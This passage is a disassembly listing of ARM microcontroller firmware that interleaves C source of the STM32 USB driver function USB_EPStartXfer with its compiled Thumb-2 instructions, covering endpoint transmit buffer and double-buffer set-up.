  if (ep->is_in == 1U)
 8006aa0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006aa4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006aa8:	681b      	ldr	r3, [r3, #0]
 8006aaa:	785b      	ldrb	r3, [r3, #1]
 8006aac:	2b01      	cmp	r3, #1
 8006aae:	f040 86b7 	bne.w	8007820 <USB_EPStartXfer+0xd9a>
  {
    /*Multi packet transfer*/
    if (ep->xfer_len > ep->maxpacket)
 8006ab2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ab6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006aba:	681b      	ldr	r3, [r3, #0]
 8006abc:	699a      	ldr	r2, [r3, #24]
 8006abe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ac2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ac6:	681b      	ldr	r3, [r3, #0]
 8006ac8:	691b      	ldr	r3, [r3, #16]
 8006aca:	429a      	cmp	r2, r3
 8006acc:	d908      	bls.n	8006ae0 <USB_EPStartXfer+0x5a>
    {
      len = ep->maxpacket;
 8006ace:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ad2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ad6:	681b      	ldr	r3, [r3, #0]
 8006ad8:	691b      	ldr	r3, [r3, #16]
 8006ada:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
 8006ade:	e007      	b.n	8006af0 <USB_EPStartXfer+0x6a>
    }
    else
    {
      len = ep->xfer_len;
 8006ae0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ae4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ae8:	681b      	ldr	r3, [r3, #0]
 8006aea:	699b      	ldr	r3, [r3, #24]
 8006aec:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
    }

    /* configure and validate Tx endpoint */
    if (ep->doublebuffer == 0U)
 8006af0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006af4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006af8:	681b      	ldr	r3, [r3, #0]
 8006afa:	7b1b      	ldrb	r3, [r3, #12]
 8006afc:	2b00      	cmp	r3, #0
 8006afe:	d13a      	bne.n	8006b76 <USB_EPStartXfer+0xf0>
    {
      USB_WritePMA(USBx, ep->xfer_buff, ep->pmaadress, (uint16_t)len);
 8006b00:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b04:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b08:	681b      	ldr	r3, [r3, #0]
 8006b0a:	6959      	ldr	r1, [r3, #20]
 8006b0c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b10:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b14:	681b      	ldr	r3, [r3, #0]
 8006b16:	88da      	ldrh	r2, [r3, #6]
 8006b18:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006b1c:	b29b      	uxth	r3, r3
 8006b1e:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006b22:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006b26:	6800      	ldr	r0, [r0, #0]
 8006b28:	f001 fcb9 	bl	800849e <USB_WritePMA>
      PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8006b2c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b30:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b34:	681b      	ldr	r3, [r3, #0]
 8006b36:	613b      	str	r3, [r7, #16]
 8006b38:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b3c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b40:	681b      	ldr	r3, [r3, #0]
 8006b42:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006b46:	b29b      	uxth	r3, r3
 8006b48:	461a      	mov	r2, r3
 8006b4a:	693b      	ldr	r3, [r7, #16]
 8006b4c:	4413      	add	r3, r2
 8006b4e:	613b      	str	r3, [r7, #16]
 8006b50:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b54:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b58:	681b      	ldr	r3, [r3, #0]
 8006b5a:	781b      	ldrb	r3, [r3, #0]
 8006b5c:	00da      	lsls	r2, r3, #3
 8006b5e:	693b      	ldr	r3, [r7, #16]
 8006b60:	4413      	add	r3, r2
 8006b62:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006b66:	60fb      	str	r3, [r7, #12]
 8006b68:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006b6c:	b29a      	uxth	r2, r3
 8006b6e:	68fb      	ldr	r3, [r7, #12]
 8006b70:	801a      	strh	r2, [r3, #0]
 8006b72:	f000 be1f 	b.w	80077b4 <USB_EPStartXfer+0xd2e>
    }
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* double buffer bulk management */
      if (ep->type == EP_TYPE_BULK)
 8006b76:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b7a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b7e:	681b      	ldr	r3, [r3, #0]
 8006b80:	78db      	ldrb	r3, [r3, #3]
 8006b82:	2b02      	cmp	r3, #2
 8006b84:	f040 8462 	bne.w	800744c <USB_EPStartXfer+0x9c6>
      {
        if (ep->xfer_len_db > ep->maxpacket)
 8006b88:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b8c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b90:	681b      	ldr	r3, [r3, #0]
 8006b92:	6a1a      	ldr	r2, [r3, #32]
 8006b94:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b98:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b9c:	681b      	ldr	r3, [r3, #0]
 8006b9e:	691b      	ldr	r3, [r3, #16]
 8006ba0:	429a      	cmp	r2, r3
 8006ba2:	f240 83df 	bls.w	8007364 <USB_EPStartXfer+0x8de>
        {
          /* enable double buffer */
          PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006ba6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006baa:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006bae:	681a      	ldr	r2, [r3, #0]
 8006bb0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bb4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006bb8:	681b      	ldr	r3, [r3, #0]
 8006bba:	781b      	ldrb	r3, [r3, #0]
 8006bbc:	009b      	lsls	r3, r3, #2
 8006bbe:	4413      	add	r3, r2
 8006bc0:	881b      	ldrh	r3, [r3, #0]
 8006bc2:	b29b      	uxth	r3, r3
 8006bc4:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006bc8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006bcc:	f8a7 3056 	strh.w	r3, [r7, #86]	; 0x56
 8006bd0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bd4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006bd8:	681a      	ldr	r2, [r3, #0]
 8006bda:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bde:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006be2:	681b      	ldr	r3, [r3, #0]
 8006be4:	781b      	ldrb	r3, [r3, #0]
 8006be6:	009b      	lsls	r3, r3, #2
 8006be8:	441a      	add	r2, r3
 8006bea:	f8b7 3056 	ldrh.w	r3, [r7, #86]	; 0x56
 8006bee:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006bf2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006bf6:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 8006bfa:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006bfe:	b29b      	uxth	r3, r3
 8006c00:	8013      	strh	r3, [r2, #0]

          /* each Time to write in PMA xfer_len_db will */
          ep->xfer_len_db -= len;
 8006c02:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c06:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c0a:	681b      	ldr	r3, [r3, #0]
 8006c0c:	6a1a      	ldr	r2, [r3, #32]
 8006c0e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c12:	1ad2      	subs	r2, r2, r3
 8006c14:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c18:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c1c:	681b      	ldr	r3, [r3, #0]
 8006c1e:	621a      	str	r2, [r3, #32]

          /* Fill the two first buffer in the Buffer0 & Buffer1 */
          if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 8006c20:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c24:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c28:	681a      	ldr	r2, [r3, #0]
 8006c2a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c2e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c32:	681b      	ldr	r3, [r3, #0]
 8006c34:	781b      	ldrb	r3, [r3, #0]
 8006c36:	009b      	lsls	r3, r3, #2
 8006c38:	4413      	add	r3, r2
 8006c3a:	881b      	ldrh	r3, [r3, #0]
 8006c3c:	b29b      	uxth	r3, r3
 8006c3e:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006c42:	2b00      	cmp	r3, #0
 8006c44:	f000 81c7 	beq.w	8006fd6 <USB_EPStartXfer+0x550>
          {
            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8006c48:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c4c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c50:	681b      	ldr	r3, [r3, #0]
 8006c52:	633b      	str	r3, [r7, #48]	; 0x30
 8006c54:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c58:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c5c:	681b      	ldr	r3, [r3, #0]
 8006c5e:	785b      	ldrb	r3, [r3, #1]
 8006c60:	2b00      	cmp	r3, #0
 8006c62:	d177      	bne.n	8006d54 <USB_EPStartXfer+0x2ce>
 8006c64:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c68:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c6c:	681b      	ldr	r3, [r3, #0]
 8006c6e:	62bb      	str	r3, [r7, #40]	; 0x28
 8006c70:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c74:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c78:	681b      	ldr	r3, [r3, #0]
 8006c7a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006c7e:	b29b      	uxth	r3, r3
 8006c80:	461a      	mov	r2, r3
 8006c82:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006c84:	4413      	add	r3, r2
 8006c86:	62bb      	str	r3, [r7, #40]	; 0x28
 8006c88:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c8c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c90:	681b      	ldr	r3, [r3, #0]
 8006c92:	781b      	ldrb	r3, [r3, #0]
 8006c94:	00da      	lsls	r2, r3, #3
 8006c96:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006c98:	4413      	add	r3, r2
 8006c9a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006c9e:	627b      	str	r3, [r7, #36]	; 0x24
 8006ca0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006ca2:	881b      	ldrh	r3, [r3, #0]
 8006ca4:	b29b      	uxth	r3, r3
 8006ca6:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006caa:	b29a      	uxth	r2, r3
 8006cac:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006cae:	801a      	strh	r2, [r3, #0]
 8006cb0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006cb4:	2b3e      	cmp	r3, #62	; 0x3e
 8006cb6:	d921      	bls.n	8006cfc <USB_EPStartXfer+0x276>
 8006cb8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006cbc:	095b      	lsrs	r3, r3, #5
 8006cbe:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006cc2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006cc6:	f003 031f 	and.w	r3, r3, #31
 8006cca:	2b00      	cmp	r3, #0
 8006ccc:	d104      	bne.n	8006cd8 <USB_EPStartXfer+0x252>
 8006cce:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006cd2:	3b01      	subs	r3, #1
 8006cd4:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006cd8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006cda:	881b      	ldrh	r3, [r3, #0]
 8006cdc:	b29a      	uxth	r2, r3
 8006cde:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006ce2:	b29b      	uxth	r3, r3
 8006ce4:	029b      	lsls	r3, r3, #10
 8006ce6:	b29b      	uxth	r3, r3
 8006ce8:	4313      	orrs	r3, r2
 8006cea:	b29b      	uxth	r3, r3
 8006cec:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006cf0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006cf4:	b29a      	uxth	r2, r3
 8006cf6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006cf8:	801a      	strh	r2, [r3, #0]
 8006cfa:	e050      	b.n	8006d9e <USB_EPStartXfer+0x318>
 8006cfc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d00:	2b00      	cmp	r3, #0
 8006d02:	d10a      	bne.n	8006d1a <USB_EPStartXfer+0x294>
 8006d04:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006d06:	881b      	ldrh	r3, [r3, #0]
 8006d08:	b29b      	uxth	r3, r3
 8006d0a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006d0e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006d12:	b29a      	uxth	r2, r3
 8006d14:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006d16:	801a      	strh	r2, [r3, #0]
 8006d18:	e041      	b.n	8006d9e <USB_EPStartXfer+0x318>
 8006d1a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d1e:	085b      	lsrs	r3, r3, #1
 8006d20:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006d24:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d28:	f003 0301 	and.w	r3, r3, #1
 8006d2c:	2b00      	cmp	r3, #0
 8006d2e:	d004      	beq.n	8006d3a <USB_EPStartXfer+0x2b4>
 8006d30:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006d34:	3301      	adds	r3, #1
 8006d36:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006d3a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006d3c:	881b      	ldrh	r3, [r3, #0]
 8006d3e:	b29a      	uxth	r2, r3
 8006d40:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006d44:	b29b      	uxth	r3, r3
 8006d46:	029b      	lsls	r3, r3, #10
 8006d48:	b29b      	uxth	r3, r3
 8006d4a:	4313      	orrs	r3, r2
 8006d4c:	b29a      	uxth	r2, r3
 8006d4e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006d50:	801a      	strh	r2, [r3, #0]
 8006d52:	e024      	b.n	8006d9e <USB_EPStartXfer+0x318>
 8006d54:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d58:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d5c:	681b      	ldr	r3, [r3, #0]
 8006d5e:	785b      	ldrb	r3, [r3, #1]
 8006d60:	2b01      	cmp	r3, #1
 8006d62:	d11c      	bne.n	8006d9e <USB_EPStartXfer+0x318>
 8006d64:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d68:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d6c:	681b      	ldr	r3, [r3, #0]
 8006d6e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006d72:	b29b      	uxth	r3, r3
 8006d74:	461a      	mov	r2, r3
 8006d76:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006d78:	4413      	add	r3, r2
 8006d7a:	633b      	str	r3, [r7, #48]	; 0x30
 8006d7c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d80:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d84:	681b      	ldr	r3, [r3, #0]
 8006d86:	781b      	ldrb	r3, [r3, #0]
 8006d88:	00da      	lsls	r2, r3, #3
 8006d8a:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006d8c:	4413      	add	r3, r2
 8006d8e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006d92:	62fb      	str	r3, [r7, #44]	; 0x2c
 8006d94:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d98:	b29a      	uxth	r2, r3
 8006d9a:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8006d9c:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 8006d9e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006da2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006da6:	681b      	ldr	r3, [r3, #0]
 8006da8:	895b      	ldrh	r3, [r3, #10]
 8006daa:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006dae:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006db2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006db6:	681b      	ldr	r3, [r3, #0]
 8006db8:	6959      	ldr	r1, [r3, #20]
 8006dba:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006dbe:	b29b      	uxth	r3, r3
 8006dc0:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006dc4:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006dc8:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006dcc:	6800      	ldr	r0, [r0, #0]
 8006dce:	f001 fb66 	bl	800849e <USB_WritePMA>
            ep->xfer_buff += len;
 8006dd2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dd6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dda:	681b      	ldr	r3, [r3, #0]
 8006ddc:	695a      	ldr	r2, [r3, #20]
 8006dde:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006de2:	441a      	add	r2, r3
 8006de4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006de8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dec:	681b      	ldr	r3, [r3, #0]
 8006dee:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 8006df0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006df4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006df8:	681b      	ldr	r3, [r3, #0]
 8006dfa:	6a1a      	ldr	r2, [r3, #32]
 8006dfc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e00:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e04:	681b      	ldr	r3, [r3, #0]
 8006e06:	691b      	ldr	r3, [r3, #16]
 8006e08:	429a      	cmp	r2, r3
 8006e0a:	d90f      	bls.n	8006e2c <USB_EPStartXfer+0x3a6>
            {
              ep->xfer_len_db -= len;
 8006e0c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e10:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e14:	681b      	ldr	r3, [r3, #0]
 8006e16:	6a1a      	ldr	r2, [r3, #32]
 8006e18:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e1c:	1ad2      	subs	r2, r2, r3
 8006e1e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e22:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e26:	681b      	ldr	r3, [r3, #0]
 8006e28:	621a      	str	r2, [r3, #32]
 8006e2a:	e00e      	b.n	8006e4a <USB_EPStartXfer+0x3c4>
            }
            else
            {
              len = ep->xfer_len_db;
 8006e2c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e30:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e34:	681b      	ldr	r3, [r3, #0]
 8006e36:	6a1b      	ldr	r3, [r3, #32]
 8006e38:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 8006e3c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e40:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e44:	681b      	ldr	r3, [r3, #0]
 8006e46:	2200      	movs	r2, #0
 8006e48:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006e4a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e4e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e52:	681b      	ldr	r3, [r3, #0]
 8006e54:	785b      	ldrb	r3, [r3, #1]
 8006e56:	2b00      	cmp	r3, #0
 8006e58:	d177      	bne.n	8006f4a <USB_EPStartXfer+0x4c4>
 8006e5a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e5e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e62:	681b      	ldr	r3, [r3, #0]
 8006e64:	61bb      	str	r3, [r7, #24]
 8006e66:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e6a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e6e:	681b      	ldr	r3, [r3, #0]
 8006e70:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006e74:	b29b      	uxth	r3, r3
 8006e76:	461a      	mov	r2, r3
 8006e78:	69bb      	ldr	r3, [r7, #24]
 8006e7a:	4413      	add	r3, r2
 8006e7c:	61bb      	str	r3, [r7, #24]
 8006e7e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e82:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e86:	681b      	ldr	r3, [r3, #0]
 8006e88:	781b      	ldrb	r3, [r3, #0]
 8006e8a:	00da      	lsls	r2, r3, #3
 8006e8c:	69bb      	ldr	r3, [r7, #24]
 8006e8e:	4413      	add	r3, r2
 8006e90:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006e94:	617b      	str	r3, [r7, #20]
 8006e96:	697b      	ldr	r3, [r7, #20]
 8006e98:	881b      	ldrh	r3, [r3, #0]
 8006e9a:	b29b      	uxth	r3, r3
 8006e9c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006ea0:	b29a      	uxth	r2, r3
 8006ea2:	697b      	ldr	r3, [r7, #20]
 8006ea4:	801a      	strh	r2, [r3, #0]
 8006ea6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006eaa:	2b3e      	cmp	r3, #62	; 0x3e
 8006eac:	d921      	bls.n	8006ef2 <USB_EPStartXfer+0x46c>
 8006eae:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006eb2:	095b      	lsrs	r3, r3, #5
 8006eb4:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006eb8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ebc:	f003 031f 	and.w	r3, r3, #31
 8006ec0:	2b00      	cmp	r3, #0
 8006ec2:	d104      	bne.n	8006ece <USB_EPStartXfer+0x448>
 8006ec4:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006ec8:	3b01      	subs	r3, #1
 8006eca:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006ece:	697b      	ldr	r3, [r7, #20]
 8006ed0:	881b      	ldrh	r3, [r3, #0]
 8006ed2:	b29a      	uxth	r2, r3
 8006ed4:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006ed8:	b29b      	uxth	r3, r3
 8006eda:	029b      	lsls	r3, r3, #10
 8006edc:	b29b      	uxth	r3, r3
 8006ede:	4313      	orrs	r3, r2
 8006ee0:	b29b      	uxth	r3, r3
 8006ee2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006ee6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006eea:	b29a      	uxth	r2, r3
 8006eec:	697b      	ldr	r3, [r7, #20]
 8006eee:	801a      	strh	r2, [r3, #0]
 8006ef0:	e056      	b.n	8006fa0 <USB_EPStartXfer+0x51a>
 8006ef2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ef6:	2b00      	cmp	r3, #0
 8006ef8:	d10a      	bne.n	8006f10 <USB_EPStartXfer+0x48a>
 8006efa:	697b      	ldr	r3, [r7, #20]
 8006efc:	881b      	ldrh	r3, [r3, #0]
 8006efe:	b29b      	uxth	r3, r3
 8006f00:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006f04:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006f08:	b29a      	uxth	r2, r3
 8006f0a:	697b      	ldr	r3, [r7, #20]
 8006f0c:	801a      	strh	r2, [r3, #0]
 8006f0e:	e047      	b.n	8006fa0 <USB_EPStartXfer+0x51a>
 8006f10:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f14:	085b      	lsrs	r3, r3, #1
 8006f16:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006f1a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f1e:	f003 0301 	and.w	r3, r3, #1
 8006f22:	2b00      	cmp	r3, #0
 8006f24:	d004      	beq.n	8006f30 <USB_EPStartXfer+0x4aa>
 8006f26:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006f2a:	3301      	adds	r3, #1
 8006f2c:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006f30:	697b      	ldr	r3, [r7, #20]
 8006f32:	881b      	ldrh	r3, [r3, #0]
 8006f34:	b29a      	uxth	r2, r3
 8006f36:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006f3a:	b29b      	uxth	r3, r3
 8006f3c:	029b      	lsls	r3, r3, #10
 8006f3e:	b29b      	uxth	r3, r3
 8006f40:	4313      	orrs	r3, r2
 8006f42:	b29a      	uxth	r2, r3
 8006f44:	697b      	ldr	r3, [r7, #20]
 8006f46:	801a      	strh	r2, [r3, #0]
 8006f48:	e02a      	b.n	8006fa0 <USB_EPStartXfer+0x51a>
 8006f4a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f4e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f52:	681b      	ldr	r3, [r3, #0]
 8006f54:	785b      	ldrb	r3, [r3, #1]
 8006f56:	2b01      	cmp	r3, #1
 8006f58:	d122      	bne.n	8006fa0 <USB_EPStartXfer+0x51a>
 8006f5a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f5e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f62:	681b      	ldr	r3, [r3, #0]
 8006f64:	623b      	str	r3, [r7, #32]
 8006f66:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f6a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f6e:	681b      	ldr	r3, [r3, #0]
 8006f70:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006f74:	b29b      	uxth	r3, r3
 8006f76:	461a      	mov	r2, r3
 8006f78:	6a3b      	ldr	r3, [r7, #32]
 8006f7a:	4413      	add	r3, r2
 8006f7c:	623b      	str	r3, [r7, #32]
 8006f7e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f82:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f86:	681b      	ldr	r3, [r3, #0]
 8006f88:	781b      	ldrb	r3, [r3, #0]
 8006f8a:	00da      	lsls	r2, r3, #3
 8006f8c:	6a3b      	ldr	r3, [r7, #32]
 8006f8e:	4413      	add	r3, r2
 8006f90:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006f94:	61fb      	str	r3, [r7, #28]
 8006f96:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f9a:	b29a      	uxth	r2, r3
 8006f9c:	69fb      	ldr	r3, [r7, #28]
 8006f9e:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 8006fa0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fa4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fa8:	681b      	ldr	r3, [r3, #0]
 8006faa:	891b      	ldrh	r3, [r3, #8]
 8006fac:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006fb0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fb4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
